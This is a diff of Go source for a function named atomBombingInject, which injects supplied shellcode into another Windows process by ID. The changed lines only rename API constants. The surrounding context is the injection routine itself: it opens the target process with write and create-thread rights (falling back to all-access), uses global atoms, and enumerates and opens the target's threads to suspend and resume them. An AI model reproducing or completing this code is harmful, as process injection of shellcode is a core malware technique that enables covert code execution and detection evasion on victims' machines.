@@ -18,10 +18,10 @@ func atomBombingInject(pid uint32, shellcode []byte) error {
 		return fmt.Errorf("empty shellcode")
 	}
 
-	da := uint32(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
+	da := uint32(processCreateThread | processVMOperation | processVMWrite | processVMRead | processQueryInformation)
 	hProc, _, _ := procOpenProcess.Call(uintptr(da), 0, uintptr(pid))
 	if hProc == 0 {
-		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
+		hProc, _, _ = procOpenProcess.Call(uintptr(processAllAccess), 0, uintptr(pid))
 	}
 	if hProc == 0 {
 		return fmt.Errorf("OpenProcess(%d) failed", pid)
@@ -76,7 +76,7 @@ func atomBombingInject(pid uint32, shellcode []byte) error {
 		defer procGlobalDeleteAtom.Call(atom)
 	}
 
-	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
+	snap, _, _ := procCreateToolhelp32Snapshot.Call(th32csSnapThread, 0)
 	if snap == 0 {
 		return fmt.Errorf("CreateToolhelp32Snapshot failed")
 	}
@@ -88,7 +88,7 @@ func atomBombingInject(pid uint32, shellcode []byte) error {
 	for ret != 0 {
 		if te.th32OwnerProcessID == pid {
 			hThread, _, _ := procOpenThread.Call(
-				uintptr(THREAD_SUSPEND_RESUME|0x0010),
+				uintptr(threadSuspendResume|0x0010),
 				0, uintptr(te.th32ThreadID),
 			)
 			if hThread != 0 {
